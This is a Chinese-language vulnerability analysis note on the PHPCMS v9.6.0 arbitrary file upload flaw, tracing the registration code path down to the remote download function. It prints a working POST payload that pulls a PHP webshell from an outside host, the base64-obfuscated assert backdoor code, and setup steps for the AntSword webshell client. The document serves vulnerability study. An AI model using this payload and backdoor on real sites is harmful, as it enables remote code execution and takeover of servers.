# PHPCMS v9.6.0版任意文件上传漏洞分析笔记

# 参考：

跟着松牛的代码审计调试一波。  
[PHPCMS最新版任意文件上传漏洞分析](https://mp.weixin.qq.com/s/Idbv27CCEAZzBFSPmYDmyQ)

---

# 安装：

phpcms安装：  
![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8vtqr4f8j30vg0p0whv.jpg)

中国蚁剑安装：

1.安装node.js  
下载安装[nodejs v4.0+](https://nodejs.org/)

[https://github.com/antoor/antSword/releases](https://github.com/antoor/antSword/releases)  
下载  
![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8wt526wdj317e0bsgmu.jpg)

解压，挂代理然后安装  
`$ cd antSword  
$ npm install`

在对应目录下启动：  
`npm start`

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8wv9s2nfj31cs0r2tb1.jpg)

美滋滋~mac环境下终于不用再开虚拟机用中国菜刀.exe了 。

# 漏洞复现：

漏洞复现的办法是先打开注册页面，然后向注册页面POST如下payload：

`siteid=1&modelid=11&username=123456&password=123456&email=123456@qq.com&info[content]=<img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg>&dosubmit=1&protocol=`

然后就会报错并返回shell地址：

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8vyz1051j31kw0fvdmx.jpg)

看看shell的密码:  
`<?php $ant=base64_decode("YXNzZXJ0");$ant($_POST['ant']);?>`

配置中国蚁剑：  
![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8xafur45j30oe0j8400.jpg)  
密码为ant

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8x9qtnk3j31kw0jv42q.jpg)

# 漏洞分析：

通过复现过程可以看到漏洞URL为：  
`http://phpcms.localhost/index.php?m=member&c=index&a=register&siteid=1`

> 可以确定是member模块的问题，以前我分析过phpcms的程序，所以就不从index.php看了，我们直接去打开member模块的控制器文件如下：

`/Users/striker/www/phpcmsv9/phpcms/modules/member/index.php`

## index.php

动态调试跟踪了一下index.php 。  
好吧，晕了。。。

## member/index.php

### 正常请求

正常请求中info参数和poc中的参数好像有些不同

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi8zbde0cwj31kw0f0ago.jpg)

正常请求:`info[Birthday]`  
poc的：`info[content]=<img src=http://files.hackersb.cn/webshell/antSword-shells/php_assert.php#.jpg>`

看完最后，中括号里的是可以调用的函数

### register\(\)函数：

```
public function register() {
        $this->_session_start();
        //获取用户siteid
        $siteid = isset($_REQUEST['siteid']) && trim($_REQUEST['siteid']) ? intval($_REQUEST['siteid']) : 1;
        //定义站点id常量
        if (!defined('SITEID')) {
           define('SITEID', $siteid);
        }

        //加载用户模块配置
        $member_setting = getcache('member_setting');
        if(!$member_setting['allowregister']) {
            showmessage(L('deny_register'), 'index.php?m=member&c=index&a=login');
        }
        //加载短信模块配置
         $sms_setting_arr = getcache('sms','sms');
        $sms_setting = $sms_setting_arr[$siteid];        

        header("Cache-control: private");
        if(isset($_POST['dosubmit'])) { //如果点击了提交注册，进入注册流程
            if($member_setting['enablcodecheck']=='1'){//开启验证码
                if ((empty($_SESSION['connectid']) && $_SESSION['code'] != strtolower($_POST['code']) && $_POST['code']!==NULL) || empty($_SESSION['code'])) {
                    showmessage(L('code_error'));
                } else {
                    $_SESSION['code'] = '';
                }
            }
```

> 首先是获取了一个`$siteid`然后加载了一些配置，再判断是否存在`$_POST['dosubmit']`，如果点击了提交注册按钮，进入注册流程。
>
> 通过跟进发现跟我们漏洞有关的代码应该是从129行开始：

```
//附表信息验证 通过模型获取会员信息
            if($member_setting['choosemodel']) {
                require_once CACHE_MODEL_PATH.'member_input.class.php';
                require_once CACHE_MODEL_PATH.'member_update.class.php';
                $member_input = new member_input($userinfo['modelid']);        
                $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
                $user_model_info = $member_input->get($_POST['info']);                                        
            }
```

> 其中第134行从POST请求中传入了我们EXP的关键参数`$_POST['info']`：

`$_POST['info'] = array_map('new_html_special_chars',$_POST['info']);`

> 但使用new\_html\_special\_chars函数过滤了一遍，我们来跟进下这个函数都干了些什么事情。

### htmlspecialchars\(\)函数:

```
/**
 * 返回经htmlspecialchars处理过的字符串或数组
 * @param $obj 需要处理的字符串或数组
 * @return mixed
 */
function new_html_special_chars($string) {
    $encoding = 'utf-8';
    if(strtolower(CHARSET)=='gbk') $encoding = 'ISO-8859-15';
    if(!is_array($string)) return htmlspecialchars($string,ENT_QUOTES,$encoding);
    foreach($string as $key => $val) $string[$key] = new_html_special_chars($val);
    return $string;
}
```

htmlspecialchars\(\)  
`Convert all applicable characters to HTML entities`

作用：转义HTML特殊字符

> 用了htmlspecialchars函数来转义HTML特殊字符，影响不是特别大，继续往下跟，135行调用$member\_input-&gt;get\(\)方法进行了处理：

`$user_model_info = $member_input->get($_POST['info']);`

### `$menber_input->get($data)`函数:

```
function get($data) {
        $this->data = $data = trim_script($data);
        $model_cache = getcache('member_model', 'commons');
        $this->db->table_name = $this->db_pre.$model_cache[$this->modelid]['tablename'];

        $info = array();
        $debar_filed = array('catid','title','style','thumb','status','islink','description');
        if(is_array($data)) {  //关键地方  我们payload中的info就是个数组，所以能走进这个if条件中，继续跟
            foreach($data as $field=>$value) { //先是用foreach进行遍历$info，键名为$field，键值为$value
                if($data['islink']==1 && !in_array($field,$debar_filed)) continue;
                $field = safe_replace($field); //用safe_replace进行了一次安全替换
                $name = $this->fields[$field]['name'];
                $minlength = $this->fields[$field]['minlength'];
                $maxlength = $this->fields[$field]['maxlength'];
                $pattern = $this->fields[$field]['pattern'];
                $errortips = $this->fields[$field]['errortips'];
                if(empty($errortips)) $errortips = "$name 不符合要求！";
                $length = empty($value) ? 0 : strlen($value);
                if($minlength && $length < $minlength && !$isimport) showmessage("$name 不得少于 $minlength 个字符！");
                if (!array_key_exists($field, $this->fields)) showmessage('模型中不存在'.$field.'字段');
                if($maxlength && $length > $maxlength && !$isimport) {
                    showmessage("$name 不得超过 $maxlength 个字符！");
                } else {
                    str_cut($value, $maxlength);
                }
                if($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
                if($this->fields[$field]['isunique'] && $this->db->get_one(array($field=>$value),$field) && ROUTE_A != 'edit') showmessage("$name 的值不得重复！");

                $func = $this->fields[$field]['formtype']; //关键！！！ 先是获取了一个$func，然后判断方法如果存在就带入这个函数，poc传到这里的最终的$func是editor即调用了editor()函数
                if(method_exists($this, $func)) $value = $this->$func($field, $value);

                $info[$field] = $value;
            }
        }
        return $info;
    }
```

### editor\(\)函数:

```
    function editor($field, $value) {
        $setting = string2array($this->fields[$field]['setting']);
        $enablesaveimage = $setting['enablesaveimage'];
        if(isset($_POST['spider_img'])) $enablesaveimage = 0;
        if($enablesaveimage) {
            $site_setting = string2array($this->site_config['setting']);
            $watermark_enable = intval($site_setting['watermark_enable']);
            $value = $this->attachment->download('content', $value,$watermark_enable);//重点
        }
        return $value;
    }
```

`$value = $this->attachment->download('content', $value,$watermark_enable);`

把`$value，也就是我们的info[content]`带入到了`$this->attachment->download`函数！继续跟！！

### download（）函数：

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi92wk3icuj31kw0ujar9.jpg)

# 漏洞修复：

> 而fopen一般都是可用的，如果开启了allow\_url\_fopen，这个漏洞就构成了，然而大部分环境都默认开启了allow\_url\_fopen。
>
> **最终在插入注册信息时因为混入了未知的参数而导致插入失败，报错就显示出了这个未知的参数** 23333

至此，该漏洞分析完成。

# 审计思路：

![](https://raw.githubusercontent.com/jerrychan807/imggg/master/006tKfTcgy1fi93f2nfmxj30n40zin3i.jpg)

